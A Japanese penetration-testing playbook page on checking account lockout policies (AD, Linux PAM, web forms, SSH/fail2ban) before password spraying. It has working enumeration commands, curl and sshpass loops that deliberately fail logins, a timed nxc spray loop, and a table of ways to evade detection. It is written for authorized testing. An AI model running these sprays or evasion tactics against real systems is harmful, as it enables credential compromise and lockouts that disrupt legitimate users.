# アカウントロックアウトポリシーの事前確認

## このファイルの位置づけ

辞書攻撃・パスワードスプレー・デフォルト認証情報試行を **始める前に** ロックアウト閾値・期間・観察期間を確認するための着眼点・手順を集約する。
**「何回失敗で何分ロックされるか」を試行前に取得する技術** だけを扱う。
ロックされた後にどう復旧するか（運用フロー）は技術の対象外。

---

## ロックアウト確認の全体像

### 着火条件

以下のいずれかに該当した時点で、認証試行系の作業より先にこのファイルを開く。

- パスワードスプレー / 辞書攻撃を始める直前。試行設計（並列度・試行間隔・試行上限）を作るための前提情報が必要
- `Default_Credentials.md` を流す前に、製品が独自にロックアウト機構を持っているか確認したい
- AD 環境のドメインユーザーに対して認証試行を行う場合（**ドメインポリシーで全アカウントに同じロックアウトが効く**）
- Web フォームに対する辞書攻撃前で、フォーム側のロックアウト or IP ブロックがあるか不明
- すでに 1 ～ 2 アカウントが意図せずロックされた経験があり、再発防止の事前確認をしたい

### 環境前提

- 実行環境：テスター端末
- 必要なツール：
  - `nxc`（NetExec の CLI ラッパー、ペネトレ用 Linux ディストリ標準。`--pass-pol` で AD のドメインポリシーを取得。詳細は `../05_Tools_Reference/Netexec.md`）
  - `rpcclient`（Samba スイート同梱、ペネトレ用 Linux ディストリ標準。`getdompwinfo` でパスワードポリシー確認）
  - `samrdump.py` / `policies.py`（Impacket スイート同梱、ペネトレ用 Linux ディストリ標準）
  - `ldapsearch`（OpenLDAP クライアント、標準搭載。AD の `lockoutThreshold` / `lockoutDuration` 属性を取得）
  - `curl` / `wget`（標準搭載。Web フォームの応答差分観察）
  - **ターゲット側で実行する場合**：`net accounts`（Windows 標準）/ `chage` / `passwd -S`（Linux 標準）

オフライン代替：すべて標準搭載または Impacket 配下のツールで完結。

### 観点・着眼点

**先に確認すること：**

- **対象が AD ドメインメンバーかスタンドアロンか。** スタンドアロンマシンはローカル SAM のポリシー（`net accounts /domain` ではなく `net accounts`）を持ち、AD とは別系統
- **対象が Web アプリの場合、ロックアウトがどのレイヤーで効いているか**：アプリ自体（DB 側のフラグ）/ 前段の WAF（IP ベース） / リバースプロキシ（Rate limiting）。観察結果から推定する
- **「ロックアウト閾値 0」は無効化を意味する。** AD では `0` が「ロックしない」設定。`getdompwinfo` 出力で `Account lockout threshold: 0` を見て「ロックしない」と読む

**攻撃者の思考トレース：** ロックアウト閾値を知らずに辞書攻撃すると、本物のドメインユーザーまで巻き添えで締め出される。**「閾値を取りに行く」一手は、辞書攻撃そのものより優先順位が高い。** 取れない場合はもっとも保守的な前提（閾値 3、観察期間 30 分）で試行設計する。

**ロックアウトポリシーの 4 軸（AD・Linux・Web 共通）：**

| 軸 | AD での名称 | 意味 | 試行設計への影響 |
|----|----------|-----|--------------|
| ロックアウト閾値 | `lockoutThreshold` | 連続失敗が何回でロックされるか | 1 アカウントあたりの試行は (閾値 - 1) 回までに留める |
| ロックアウト期間 | `lockoutDuration` | ロック後何分で自動解除されるか | 0 分 = 管理者解除のみ。1 分以上 = 待てば次サイクルで再試行可能 |
| 観察期間（リセットタイマー） | `lockoutObservationWindow` | 失敗カウンタが何分でゼロに戻るか | この時間以上の試行間隔を空ければ閾値超過しない |
| 失敗カウンタ | （状態） | 現在の失敗回数 | アカウントごとに別カウント。スプレーが 1 アカウント 1 回なら閾値到達しにくい |

**シグナルの読み方：**

| 観測される出力 | 示唆 | 次のアクション |
|------------|-----|------------|
| `Account lockout threshold: 0` | ロックアウト無効化 | 並列度を上げて試行可能 |
| `Account lockout threshold: 3` 以下 | 厳格運用 | スプレーは 1 アカウントあたり最大 2 試行、観察期間以上の間隔で 2 サイクル目に進む |
| `Account lockout threshold: 5～10` | 一般的設定 | スプレーは 1 アカウントあたり最大 (閾値 - 2) 試行に留めて余裕を持つ |
| `Reset account lockout counter after: 30` | 30 分の観察期間 | 1 アカウントへの次試行は 30 分以上空ける |
| `Account lockout duration: 30` | 30 分でロック自動解除 | 一度ロックしても 30 分後に再開可能（だが業務影響は残る） |
| `Account lockout duration: -1` / `Forever` | 解除に管理者操作必須 | **絶対にロックさせない設計が必要** |
| Web フォームで `IP blocked. Try again in N minutes` | IP ベース対策あり | スプレー対象の認証情報数を絞る、別 IP / 別経路 |
| Web フォームで N 回失敗後 1 リクエストで Captcha 強制 | アプリ側の段階的制限 | 最初の N - 1 回のみ自動化、その後は試行終了 |

---

## 手順

### Step 1：AD のドメインポリシー取得

#### 認証情報なし（匿名 / NULL セッション）

```bash
# [Attacker] rpcclient 匿名（古い Windows Server 2008 R2 以前は通る場合あり）
rpcclient -U "" -N [TARGET]   # [Attacker]
rpcclient $> getdompwinfo
# 出力例:
#   min_password_length: 7
#   password_properties: 0x00000001
# → これはパスワードプロパティだけで、ロックアウト情報は取れないことが多い
```

#### 認証情報あり（読み取り権限のみで OK）

```bash
# [Attacker] nxc smb の --pass-pol（最も簡潔）
nxc smb [TARGET] -u [USER] -p '[PASSWORD]' --pass-pol   # [Attacker]
# 出力例:
#   [+] Dumping password info for domain: [DOMAIN_NETBIOS]
#   Minimum password length: 7
#   Password history length: 24
#   Maximum password age: 41 days 23 hours 53 minutes
#   Password Complexity Flags: 000001
#   Account lockout threshold: 5            ← ロックアウト閾値
#   Account lockout duration: 30 minutes    ← ロックアウト期間
#   Reset Account Lockout Counter: 30 minutes  ← 観察期間
```

```bash
# [Attacker] rpcclient（認証あり）
rpcclient -U "[USER]%[PASSWORD]" [TARGET]   # [Attacker]
rpcclient $> getdompwinfo
rpcclient $> querydominfo

# [Attacker] Impacket samrdump（SAMR プロトコル経由で password policy を取得）
impacket-samrdump '[DOMAIN]/[USER]:[PASSWORD]@[TARGET]'   # [Attacker]
# 出力末尾に Password Policy セクションが出る

# [Attacker] policies.py（より詳細。Impacket）
impacket-policies '[DOMAIN]/[USER]:[PASSWORD]@[TARGET]'   # [Attacker]
# Account Lockout Threshold / Duration / Observation Window を網羅
```

#### LDAP 経由（認証情報必須）

```bash
# [Attacker] ドメインルートの lockoutThreshold / lockoutDuration / lockOutObservationWindow を取得
ldapsearch -x -H ldap://[TARGET] -D "[USER]@[DOMAIN]" -w '[PASSWORD]' \
  -b "DC=[DOMAIN_DC],DC=[TLD]" -s base \
  lockoutThreshold lockoutDuration lockOutObservationWindow   # [Attacker]
# 出力例:
#   lockoutThreshold: 5
#   lockoutDuration: -18000000000      ← 100 ナノ秒単位の負数。30 分 = -18000000000
#   lockOutObservationWindow: -18000000000

# [Attacker] LDAP 値の単位変換: lockoutDuration の絶対値 / 10000000 / 60 = 分
# 例: 18000000000 / 10000000 / 60 = 30 分
```

LDAP の `lockoutDuration` / `lockOutObservationWindow` は **負の符号付き 100 ナノ秒** で表現される。`-18000000000` は 30 分の意味。

#### 個別ユーザーの「現在の失敗回数」「ロック状態」の確認

```bash
# [Attacker] 個別ユーザーの badPwdCount / lockoutTime を確認
ldapsearch -x -H ldap://[TARGET] -D "[USER]@[DOMAIN]" -w '[PASSWORD]' \
  -b "DC=[DOMAIN_DC],DC=[TLD]" "(sAMAccountName=[TARGET_USER])" \
  badPwdCount lockoutTime userAccountControl   # [Attacker]
# badPwdCount: 現在の失敗回数（観察期間内の累積）
# lockoutTime: 0 ならロックされていない、それ以外ならロックされた時刻（FILETIME）
# userAccountControl bit 0x10 (16) が立っている場合は LOCKOUT
```

`badPwdCount` は **DC ごとの値が同期されない**（PDC エミュレータに集約される）。スプレー前後で複数 DC を見ると数字が違うことがある。

### Step 2：ターゲット側で実行できる場合（既にシェルあり）

#### Windows ローカル / ドメイン

```cmd
# [Target] ローカル SAM のポリシー
net accounts

# [Target] ドメインのポリシー
net accounts /domain

# 出力例:
#   ロックアウトのしきい値: 5
#   ロックアウト期間 (分): 30
#   ロックアウトの監視ウィンドウ (分): 30
```

```powershell
# [Target] PowerShell で AD ドメインポリシー
Get-ADDefaultDomainPasswordPolicy   # [Target]   # RSAT が必要
# LockoutThreshold / LockoutDuration / LockoutObservationWindow が出る

# [Target] 細粒度パスワードポリシー（FGPP）が設定されている場合
Get-ADFineGrainedPasswordPolicy -Filter *   # [Target]
# ドメイン既定ポリシーより優先される。特定ユーザー / グループ別に異なるロックアウトを定義できる
# → ターゲットユーザーにこちらが効いていないかを必ず確認
```

#### Linux

Linux 側は `pam_tally2` / `pam_faillock` の有無でロックアウト機構が決まる。

```bash
# [Target] PAM 設定の確認（pam_faillock / pam_tally2 が含まれているか）
grep -r "pam_tally2\|pam_faillock" /etc/pam.d/   # [Target]

# [Target] pam_faillock の deny / unlock_time 値（モダン Linux）
grep -r "deny\|unlock_time\|fail_interval" /etc/security/faillock.conf 2>/dev/null   # [Target]
grep -rE "deny=|unlock_time=|fail_interval=" /etc/pam.d/ 2>/dev/null   # [Target]

# [Target] 現在の失敗カウンタ（faillock）
faillock --user [TARGET_USER]   # [Target]

# [Target] 現在の失敗カウンタ（古いシステム：pam_tally2）
pam_tally2 --user [TARGET_USER]   # [Target]

# [Target] アカウントの状態（ロック / 期限切れ）
passwd -S [TARGET_USER]   # [Target]
# 出力 2 列目: L = locked / P = usable / NP = no password
chage -l [TARGET_USER]   # [Target]
```

### Step 3：Web アプリのロックアウト・IP ブロック観察

シェル不要。**ターゲットユーザーは事前合意で許容された 1 アカウントに絞り**、N 回連続失敗を投げて反応を見る。

```bash
# [Attacker] 同一ユーザーで意図的に 5 ～ 10 回失敗を入れて挙動観察
for i in $(seq 1 10); do
  res=$(curl -s -X POST http://[TARGET]/login \
    -d "user=[TEST_USER]&pass=invalid_${i}" \
    -w "\nHTTP=%{http_code} TIME=%{time_total} SIZE=%{size_download}\n" -o /tmp/body_${i})
  echo "=== try $i ==="
  echo "$res" | tail -1
  diff -q /tmp/body_$((i-1)) /tmp/body_${i} 2>/dev/null
  sleep 2
done   # [Attacker]
```

**観察する差分：**

| 試行回数 | 観測される変化 | 推定 |
|--------|------------|-----|
| 1 ～ 3 回目 | 同じ「Invalid credentials」レスポンス、本文・HTTP ステータス・遅延ほぼ同じ | 通常応答 |
| 4 ～ 5 回目 | レスポンスに captcha フィールド追加、または HTTP 429 | 中程度の制限。次の試行で挙動変化を見る |
| 5 ～ 10 回目 | レスポンスが `Account locked` / `IP blocked` / 接続自体がドロップ（curl が `connection refused`） | 厳格な制限。この閾値以下で試行設計 |
| 試行ごとに遅延が増える（time_total が階段状に増加） | tarpit 系（Nginx の `limit_req`、Express の `slow-down` 等） | 待てば再開できるが、自動化の効率が悪化 |

**HTTP レスポンスヘッダー固有のシグナル：**

| ヘッダー / 本文 | 意味 |
|--------------|-----|
| `Retry-After: 60` | 60 秒待てば再試行可能（標準的な Rate limiting）|
| `X-RateLimit-Limit: 60 / X-RateLimit-Remaining: 0` | 1 分間 60 回までで上限到達 |
| `Set-Cookie:` に `lockout=1` のような名前 | アプリ側で IP ベースまたはセッションベースのロック |
| 本文に `Cloudflare`・`Akamai`・`AWS WAF` ロゴ / メッセージ | 前段の CDN / WAF が遮断 |

**ユーザー名固定で 5 ～ 10 回試した時の典型的挙動 4 パターン：**

| パターン | 観察 | 推定 | 試行設計 |
|--------|------|-----|--------|
| A | レスポンスがずっと同じ | 制限なし or 大きい閾値 | スプレー進行可、ただしログ容量に注意 |
| B | N 回目から captcha / 多要素チャレンジ | 段階制限 | 自動化は N - 1 回まで |
| C | N 回目から HTTP 429 / Retry-After | Rate limiting | Retry-After 値以上の間隔で再開可 |
| D | N 回目から接続切断 / 別ページにリダイレクト | IP ブロック発動 | 同 IP では当面試行不可 |

### Step 4：SSH のロックアウト・fail2ban 観察

SSH 自体は標準ではロックアウト機構を持たない。**fail2ban / pam_faillock / sshd_config の `MaxAuthTries` のいずれかで実装される**。

```bash
# [Attacker] 試行回数 → 接続切断パターンの観察
for i in $(seq 1 8); do
  echo "=== attempt $i ==="
  sshpass -p "invalid_${i}" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
    [TEST_USER]@[TARGET] true 2>&1 | head -3
  sleep 1
done   # [Attacker]

# [Attacker] N 回連続失敗後に接続自体がタイムアウト → fail2ban で IP BAN された可能性
# 切断後に nmap で 22 番ポート確認
nmap -p 22 [TARGET]   # [Attacker]
# filtered → fail2ban の iptables rule で DROP されている
```

**`auth.log` 既知パターン（ターゲット側にシェルがある場合）：**

```bash
# [Target] fail2ban が動作しているか
systemctl status fail2ban   # [Target]
fail2ban-client status sshd   # [Target]
# 「Currently banned」リストに自分の IP が出る場合 BAN 中

# [Target] auth.log の典型的な BAN シグネチャ
grep -E "Failed password|Invalid user|fail2ban|maximum authentication" /var/log/auth.log | tail -30   # [Target]
# Failed password for [USER] from [IP] port [PORT] ssh2  → 通常の失敗ログ
# Failed password for invalid user [USER] from [IP] ...  → 存在しないユーザー名
# fail2ban.actions: NOTICE [sshd] Ban [IP]               → BAN 確定行
# error: maximum authentication attempts exceeded         → MaxAuthTries 超過（接続単位、累積ではない）
```

**`MaxAuthTries` と `fail2ban` の違い：**

| 機構 | 効果範囲 | 試行設計上の意味 |
|----|--------|--------------|
| `MaxAuthTries` (sshd_config) | 1 接続内の試行上限（既定 6） | 1 接続で 6 試行できる。再接続で再カウント、IP BAN なし |
| `fail2ban` | 期間内の失敗を集計 → 期間 BAN | BAN 期間中は接続自体不可。IP を変えるか期間待ち |
| `pam_faillock` (sshd) | アカウント単位の累積失敗 | アカウントロック。**fail2ban と異なり IP 変更では迂回できない** |

### Step 5：パスワードスプレー時の安全運用（試行間隔の設計）

ロックアウト閾値 / 観察期間が判明したら、それを満たす試行設計を作る。

**設計式：**

```
1 アカウントへの試行回数 < 閾値（保守的に閾値 - 2）
試行サイクル間隔 > 観察期間（保守的に観察期間 + 5 分）
```

**例：閾値 5、観察期間 30 分の場合：**

```
1 サイクル = 全アカウントに対して各 1 回ずつ試行
→ 各アカウントの失敗カウンタ = 1
30 分以上待つ → 観察期間経過 → カウンタゼロ
→ 2 サイクル目（次のパスワード）を投入
→ 各アカウントの失敗カウンタ = 1
...
最大 (閾値 - 2) = 3 サイクル安全に投げられる
```

```bash
# [Attacker] nxc でのスプレー速度制御
nxc smb [TARGET] -u users.txt -p '[SPRAY_PW1]' --continue-on-success   # [Attacker]
# nxc は 1 アカウント 1 試行で進むため、上記のサイクル設計に合致
# 連続実行する場合は必ず観察期間以上の sleep を挟む

# [Attacker] sleep を挟んだ複数パスワードスプレー
# [SPRAY_PW1] [SEASONAL_PW] [COMMON_WEAK_PW] には組織で当たりやすい弱パスワードの候補を入れる
# （典型例：英単語 + 数字 / 季節（英語）+ 西暦 / 組織名 + 数字 等。
#   実値は WRITING_GUIDE.md の禁止例に該当しないものをテストごとに決める）
for pw in '[SPRAY_PW1]' '[SEASONAL_PW]' '[COMMON_WEAK_PW]'; do
  nxc smb [TARGET] -u users.txt -p "$pw" --continue-on-success
  echo "Sleeping 35 minutes (observation window + buffer)..."
  sleep 2100   # 35 分
done   # [Attacker]
```

**継続試行検知の回避観点：**

| 検知パターン | 回避策 |
|----------|------|
| 同一 IP からの連続認証失敗 | 試行間隔を空ける、可能なら別 IP に切り替え |
| 同一ユーザー名への連続失敗 | スプレー（全ユーザーに 1 試行ずつ）に徹する。ブルートフォース（1 ユーザーに複数試行）を避ける |
| 業務時間外の認証ログ偏り | 業務時間帯（事前合意で許容された時間枠内）に重ねる |
| 短時間の高頻度試行 | nxc / hydra の並列度を 1 に抑える（`-t 1`）/ 各試行間に sleep |
| 弱パスワード辞書の特徴的順序 | 候補リストをシャッフル、組織固有の語彙（社名・地名・年）を先頭に |

---

## 刺さらなかったとき

| 観測される症状 | 推定原因 | 対処 |
|--------------|---------|------|
| `nxc smb --pass-pol` が `STATUS_ACCESS_DENIED` | 認証ユーザーにポリシー読み取り権限がない | 別の認証情報を取得、または LDAP 匿名でドメインルート属性を試す |
| 匿名 rpcclient で `getdompwinfo` がエラー | NULL セッション無効化 | 認証情報取得を待つ。ポリシー不明前提（閾値 3、観察期間 30 分）で保守的に試行設計 |
| Web で観察した N 回失敗後の挙動が毎回違う | サーバー側の応答にランダム要素 / セッション状態依存 | Cookie / トークンを毎回取り直して試行、複数セッションで観察 |
| ターゲット側で `net accounts` 実行不可（権限不足）| 一般ユーザー権限のみ | 列挙系のコマンド（`whoami /priv`）で取得可能な情報に絞る、上位権限取得後に再試行 |
| FGPP（細粒度パスワードポリシー）の有無が不明 | ドメイン既定ポリシーと別系統 | `Get-ADFineGrainedPasswordPolicy` 必須。RSAT が無いマシンでは LDAP の `msDS-PasswordSettings` クラスを直接列挙 |
| LDAP の `lockoutDuration` が 0 | ドメイン既定で「ロックアウトなし」 | スプレーの並列度を上げて良いが、それでも 4625 ログは大量発生する点に注意 |

---

## 注意点・落とし穴

> **[HIGH IMPACT]** ロックアウト確認自体は読み取り操作で業務影響は無いが、**この確認を怠ったままスプレー / 辞書攻撃に入ると業務停止につながる**。本番では必ず本ファイルの手順を踏んでから認証試行を行う。

- **ポリシー取得が成功した場合でも、FGPP（Fine-Grained Password Policy）でターゲットユーザーに別ポリシーが効いていないか必ず確認する**。FGPP は特定ユーザー / グループ単位でドメイン既定より厳しいロックアウトを定義できる
- **`badPwdCount` は DC ごとに同期しない**（PDC エミュレータに集約される）。1 つの DC で badPwdCount が低くても、PDC 側では閾値に近づいている可能性
- **観察期間 = ロックアウト期間ではない**。観察期間（リセットタイマー）が切れる前に閾値到達 → ロック。ロックアウト期間中は試行自体が記録上の失敗にカウントされない（既にロック状態）。**観察期間の方を試行設計に使う**
- **「ロックアウト閾値 0」は無効化を意味する** が、SIEM 側のアラートが「N 回失敗で alarm」と別に設定されている可能性は残る。ロックなし ≠ 検知なし
- **Web アプリ側ロックアウトは UI に表示されないことが多い**。「Invalid credentials」しか出さず裏で badPwdCount を上げているアプリも普通にある。観察試行は **事前合意で許容されたテストアカウント** に絞る
- **fail2ban は「IP 単位」のため、ロック後に IP を変えれば SSH 側からは復旧する**。ただしターゲット側のログに証跡が残る
- **`pam_faillock` はアカウント単位**で、IP 変更では迂回できない。SSH 経由でこれが効いている環境は AD の `lockoutThreshold` と独立して設定できる
- **観察試行で本物のユーザーアカウントを使わない**。事前合意されたテスト用アカウント（例：`[テスト略号]_TEST`）で観察し、本物のユーザーへのスプレーは設計確定後に行う
- **「保守的前提（閾値 3、観察期間 30 分）」を覚えておく**。ポリシーが取れない場合の既定値として運用する

---

## 本番での前提

- **事前合意の要否**: ★★（口頭確認可）。ロックアウト確認自体は読み取り操作で業務影響なし。ただし観察試行で **テストアカウント以外を使う場合は ★★★ に格上げ**
- **想定される SIEM / EDR 検知**:
  - Windows: `--pass-pol` / `samrdump` は SAMR プロトコル経由のドメイン情報取得 → Event ID 4661（オブジェクトハンドル要求）として記録される可能性
  - LDAP 直叩きは Event ID 1644（LDAP 検索クエリ）が有効化されている環境で記録
  - 観察試行（意図的失敗）は通常のログイン失敗と同じ Event ID 4625
- **業務影響リスク**: 確認手順自体は無し。観察試行で本物のユーザー名を使った場合のみ、そのユーザーが閾値手前まで失敗カウンタを進めるリスク
- **原状回復必須項目**: ✅ 観察試行で進めた `badPwdCount` の自然減（観察期間経過待ち）、または管理者にカウントリセット依頼 / ✅ 取得したポリシー情報の暗号化保管
- **取得情報の取扱**: ロックアウトポリシー値は試行設計用の内部資料、テスト完了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：SMB 経由の匿名列挙の延長で `--pass-pol` → `../01_Reconnaissance/SMB_Enumeration.md`
- 前：LDAP 認証取得後にドメインルート属性を取得 → `../01_Reconnaissance/LDAP_Enumeration.md`
- 前：SSH 対応認証方式の確認（`publickey` のみならスプレー不要） → `./SSH.md`
- 前：`--pass-pol` の詳細 → `../05_Tools_Reference/Netexec.md`
- 後：ポリシー確定後にデフォルト認証情報試行へ進む → `./Default_Credentials.md`
- 後：SSH の試行設計に反映 → `./SSH.md`
- 後：FTP の試行設計に反映 → `./FTP.md`
- 後：WinRM の試行設計に反映 → `./Protocol_Exploitation.md`
- 後：取得済みパスワードの使い回し確認時、試行回数制御に使う → `./Credential_Discovery.md`
- 後：パスワードスプレー実行時の `--continue-on-success` / sleep 設計 → `../05_Tools_Reference/Netexec.md`
